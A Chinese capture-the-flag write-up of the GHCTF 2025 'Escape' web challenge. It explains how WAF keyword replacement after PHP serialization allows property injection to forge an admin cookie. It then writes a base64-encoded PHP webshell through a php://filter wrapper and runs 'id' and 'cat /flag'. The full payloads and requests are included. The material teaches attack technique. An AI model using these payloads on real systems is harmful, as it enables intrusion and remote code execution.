#  GHCTF 2025 Escape!复现  
原创 凉城
                    凉城  ListSec   2026-03-10 13:22  
  
# GHCTF 2025 Escape  
  
https://www.nssctf.cn/problem/6537  
  
**题目思路**  
  
这题的核心不是普通登录绕过，而是一个"WAF 破坏序列化结构，"再结合"后台任意文件写入"的链式利用。  
  
大致流程是：  
1. 1. 注册、登录后服务端下发 user_token  
。  
  
1. 2. dashboard.php  
 有一个"文件写入器"。  
  
1. 3. 普通用户提交会显示"权限不足，写入失败"。  
  
1. 4. 题目提示说 WAF “不仅没让网站更安全，反而给了黑客机会”，关键就在 user_token  
 的生成过程。  
  
**漏洞点 1：WAF 作用在序列化结果上**  
  
登录成功后拿到的 Cookie 类似：  
```
user_token=base64( serialize(User 对象) | 签名 )
```  
  
正常情况下，解码后会长这样：  
```
O:4:"User":2:{s:8:"username";s:6:"admin1";s:7:"isadmin";b:0;}|<hash>
```  
  
  
c31d941238626cd562b89355935f4a58_MD5  
  
但实际测试发现，WAF 会对关键字做替换，而且替换发生在序列化之后。比如：  
- • and  
 被替换成 error  
  
- • select  
 也会被替换成 error  
  
这样就会破坏 serialize()  
 中的长度字段。  
  
举个例子，若用户名里含有 and  
，原本长度是 3，替换后变成 error  
，长度变成 5，序列化字符串里的 s:x:"..."  
 长度值却不会自动更新。这样服务端后续 unserialize()  
 时，字符串边界就会错位，导致后面的内容被解释成新的序列化字段。  
  
这就给了我们注入额外属性的机会。  
  
**漏洞点 2：构造管理员 token**  
  
目标是让反序列化结果里的 isadmin  
 变成 b:1  
。  
  
构造用户名为：  
```
andandandandandandandandandandandselect";s:7:"isadmin";b:1;}
```  
  
思路：  
- • 前面堆很多 and  
，让替换后字符串显著变长。  
  
- • 再拼一个 select  
，让替换后略缩短。  
  
- • 通过长度错位，把后面的 ";s:7:"isadmin";b:1;}  
 注入到反序列化结构中。  
  
注册后再登录这个用户，服务端会自己签发一枚"合法签名"的管理员 Cookie。  
  
登录请求：  
```
POST/login.phpHTTP/1.1Host: node6.anna.nssctf.cn:26870Content-Type: application/x-www-form-urlencodedusername=andandandandandandandandandandandselect";s:7:"isadmin";b:1;}&password=x
```  
  
登录成功返回的 Set-Cookie: user_token=...  
 中，已经可以看到被注入进去的 b:1  
 痕迹。  
  
  
ed65c83115b082ed7a6b7b828f9400b6_MD5  
  
**漏洞点 3：管理员文件写入**  
  
带着管理员 Cookie 去访问 dashboard.php  
，再 POST  
：  
```
POST/dashboard.phpHTTP/1.1Host: node6.anna.nssctf.cn:26870Cookie: user_token=<管理员 token>Content-Type: application/x-www-form-urlencodedfilename=1&txt=1
```  
  
此时页面不再回显"权限不足，写入失败"，说明已经获得管理员写入权限。  
  
  
222e93797b60c530fb8d10f92fb96868_MD5  
  
**漏洞点 4：写文件有前缀保护，但可用 filter 绕过**  
  
继续测试发现，写入的文件内容会被服务端强制加前缀：  
  
  
9e051d159ba35906bc14201ed15630f6_MD5  
```
<?phpexit; ?>
```  
  
例如写入 /1  
 后访问，返回内容类似：  
```
<?phpexit; ?>1
```  
  
  
3d9a1c94d26fc39c19e9dd8a876d56e6_MD5  
  
这意味着不能直接写普通 PHP webshell，但可以利用 PHP 流包装器：  
```
php://filter/write=convert.base64-decode/resource=shell.php
```  
  
服务端写入时的整体内容会变成：  
```
<?php exit; ?>APD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
```  
  
经过 convert.base64-decode  
 后，前缀中的非法 base64 字符会被忽略，最终落盘为一段可执行 PHP。  
  
关键写入请求：  
```
POST/dashboard.phpHTTP/1.1Host: node6.anna.nssctf.cn:26870Cookie: user_token=<管理员 token>Content-Type: application/x-www-form-urlencodedfilename=php://filter/write=convert.base64-decode/resource=shell.php&txt=APD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
```  
  
这里 txt  
 解码后对应的 shell 为：  
```
<?phpsystem($_GET[c]);?>
```  
  
如图：  
  
  
fa1acb77a8807c6328ff2082d7b8ad73_MD5  
  
**拿到 RCE 并读取 flag**  
  
验证命令执行：  
```
GET/shell.php?c=idHTTP/1.1Host: node6.anna.nssctf.cn:26870
```  
  
  
5b15c519035b9017307403f03cababa3_MD5  
  
读取 flag：  
```
GET/shell.php?c=cat%20/flagHTTP/1.1Host: node6.anna.nssctf.cn:26870
```  
  
返回flag：  
```
NSSCTF{ae9a09af-0cd5-4b7e-a8d4-f465cbf1d655}
```  
  
  
  
